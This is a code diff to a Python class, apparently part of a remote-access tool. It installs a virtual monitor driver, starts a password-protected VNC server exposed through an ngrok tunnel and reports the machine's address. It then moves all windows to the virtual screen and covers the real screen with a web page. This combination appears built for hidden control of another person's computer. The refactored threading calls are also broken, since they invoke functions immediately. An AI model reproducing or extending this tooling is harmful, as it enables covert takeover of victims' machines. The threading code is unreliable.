@@ -8,8 +8,6 @@ from ngrok import builder, getTunnels
 from windowsManager import moveAll
 
 
-def exit_handler(self):
-    print('my aplication exiting')
 
 class VNC():
     
@@ -24,6 +22,9 @@ class VNC():
         self.viewPWD = gerarPassword()
 
         self.h = HTTP()
+
+        self.bits = self.getArch()
+        self.device = self.selectDevice(self.bits)
 
     def runOnCmd(self, cmd):
         output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
@@ -69,8 +70,8 @@ class VNC():
     def lockScreen(self, url):
         builderWebView(url)
 
-    def verificarSeCriouMonitor(self, device):
-        cmd = ["cd", self.__usbmmiddPath, "&", device, 'status', 'usbmmidd']
+    def verificarSeCriouMonitor(self):
+        cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'status', 'usbmmidd']
         output = self.runOnCmd(cmd)
         if 'Driver is running' in output:
             #print('monitor criado com sucesso!')
@@ -101,29 +102,33 @@ class VNC():
     def criar2Monitor(self):
 
         try:
-            bits = self.getArch()
-            device = self.selectDevice(bits)
-            cmd = ["cd", self.__usbmmiddPath, "&", device, 'status', 'usbmmidd']
+            cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'status', 'usbmmidd']
 
             output= self.runOnCmd(cmd)
             if 'No matching devices found.' in output:
-                cmd = ["cd", self.__usbmmiddPath, "&", device, 'install' , 'usbmmidd.inf', 'usbmmidd']
+                cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'install' , 'usbmmidd.inf', 'usbmmidd']
                 output = self.runOnCmd(cmd)
-                if self.verificarSeCriouMonitor(device):
+                if self.verificarSeCriouMonitor():
                     #print('ativando monitor')
-                    cmd = ["cd", self.__usbmmiddPath, "&", device, 'enableidd' , '1']
+                    cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'enableidd' , '1']
                     self.runOnCmd(cmd)
             else:
                 #print('Monitor virtual já existe!\nAtivando monitor\nMonitor Ativado!')
-                cmd = ["cd", self.__usbmmiddPath, "&", device, 'enableidd' , '1']
+                cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'enableidd' , '1']
                 self.runOnCmd(cmd)
 
         except Exception as e:
             print(f'Ocorreu um erro {e}')
 
-    def setMonitorToExtend(self):
-        cmd = [self.__displayPath, "/extend"]
+    def setMonitorMode(self):
+        
+        if self.verificarSeCriouMonitor():
+            cmd = [self.__displayPath, '/extend']
+        else:
+            cmd = [self.__displayPath, '/internal']
         self.runOnCmd(cmd)
+
+
 
     def postPC(self):
         ip = builder()
@@ -145,9 +150,9 @@ class VNC():
             self.criar2Monitor()
             self.setPWD()
             self.pararServer()
-            Thread(target=self.setMonitorToExtend).start()
+            Thread(target=self.setMonitorMode()).start()
             self.rodarServer()
-            moveAll()
+            Thread(target=moveAll()).start()
             self.lockScreen(self.htmlURL)
             print("application end")
         except KeyboardInterrupt:
